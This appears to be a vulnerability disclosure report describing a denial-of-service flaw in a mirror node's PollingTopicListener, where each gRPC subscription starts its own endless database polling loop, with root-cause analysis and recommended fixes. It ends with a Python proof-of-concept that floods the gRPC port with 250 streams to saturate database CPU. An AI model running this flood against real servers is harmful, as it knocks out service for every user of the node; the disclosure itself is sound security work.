### Title
Unbounded Per-Subscriber DB Polling Loop in `PollingTopicListener` Enables DB CPU Exhaustion DoS

### Summary
`PollingTopicListener.listen()` is a cold Reactor publisher: every new subscription spawns an independent `PollingContext` and a `RepeatSpec.times(Long.MAX_VALUE)` polling loop that issues a full DB query every `interval` milliseconds (default 500 ms). Because there is no global cap on the number of concurrent subscriptions, an unprivileged attacker who opens many gRPC connections — each carrying up to `maxConcurrentCallsPerConnection` (default 5) streams — multiplies DB query rate linearly with subscriber count, exhausting DB CPU.

### Finding Description

**Exact code path:**

`PollingTopicListener.java`, `listen()`, lines 34–48:
```java
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    PollingContext context = new PollingContext(filter);   // new context per subscriber
    Duration interval = listenerProperties.getInterval(); // default 500 ms

    return Flux.defer(() -> poll(context))                // cold: runs per-subscriber
            .delaySubscription(interval, scheduler)
            .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)  // infinite loop
                    .jitter(0.1)
                    .withFixedDelay(interval)
                    .withScheduler(scheduler))
            ...
}
```

`poll()` (lines 51–61) calls `topicMessageRepository.findByFilter(newFilter)`, which executes a full JPA/SQL query against the `topic_message` table on every iteration.

**Root cause:** `Flux.defer()` makes this a cold publisher — each subscription materialises its own independent polling loop. There is no shared state, no deduplication, and no subscription counter check before spawning the loop.

**Why existing checks are insufficient:**

1. `NettyProperties.maxConcurrentCallsPerConnection = 5` (GrpcConfiguration.java, line 33) limits streams *per connection*, not total connections. An attacker opens C connections × 5 streams = 5C independent polling loops.
2. `ListenerProperties` has no `maxSubscribers` field.
3. `TopicMessageServiceImpl.subscriberCount` (line 48) is a metric gauge only — it is never checked against a limit before allowing a new subscription.
4. `CompositeTopicListener` (lines 46–58) routes to `PollingTopicListener` when `type = POLL` with no additional guard.
5. The `boundedElastic()` scheduler throttles threads but not DB connections; queries queue up and still execute.

**Contrast with safe alternative:** `SharedPollingTopicListener` uses `.share()` (line 52) to create a single hot publisher shared across all subscribers — one DB query per interval regardless of subscriber count. `PollingTopicListener` has no equivalent sharing.

### Impact Explanation
With `type = POLL` configured, N concurrent subscriptions produce N independent DB queries every 500 ms. At 100 connections × 5 streams = 500 subscriptions, the DB receives 1,000 queries/second against the `topic_message` table. Each query performs an index scan with `ORDER BY consensus_timestamp`, which is CPU-intensive at scale. This exhausts DB CPU, causing query latency to spike for all mirror-node consumers (REST API, other gRPC streams), effectively taking down the mirror node's data layer.

### Likelihood Explanation
The attack requires only a gRPC client library and the ability to open TCP connections to the mirror node's gRPC port (default 5600). No authentication, API key, or privileged account is needed — the `subscribeTopic` RPC is unauthenticated. The only precondition is that the operator has set `hiero.mirror.grpc.listener.type=POLL`; this is a documented, supported configuration option. The attack is trivially scriptable, repeatable, and requires no special knowledge beyond the public gRPC proto definition.

### Recommendation
1. **Immediate:** Add a configurable global subscription limit in `TopicMessageServiceImpl.subscribeTopic()` — check `subscriberCount` against a `maxSubscribers` property and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Per-IP throttling:** Integrate a gRPC `ServerInterceptor` that rate-limits `subscribeTopic` calls per remote address.
3. **Deprecate `POLL` mode for multi-subscriber use:** Document that `POLL` mode is unsafe under concurrent load and enforce a low `maxConcurrentCallsPerConnection` (e.g., 1) when `type=POLL` is set, or redirect operators to `SHARED_POLL`.
4. **Refactor `PollingTopicListener`:** Convert it to a hot shared publisher (like `SharedPollingTopicListener`) so DB query rate is independent of subscriber count.

### Proof of Concept
```python
# Requires: grpcio, hedera mirror node proto stubs
# Precondition: server configured with hiero.mirror.grpc.listener.type=POLL

import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
CONNECTIONS = 50   # 50 TCP connections
STREAMS_PER_CONN = 5  # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1)
    )
    streams = []
    for _ in range(STREAMS_PER_CONN):
        # Each call spawns an independent 500ms DB polling loop
        streams.append(stub.subscribeTopic(query))
    # Keep streams alive
    for s in streams:
        try:
            for _ in s: pass
        except: pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(CONNECTIONS)]
for t in threads: t.start()
# Result: 250 independent DB queries firing every 500ms = 500 queries/sec
# DB CPU climbs to saturation; all mirror node queries degrade
```
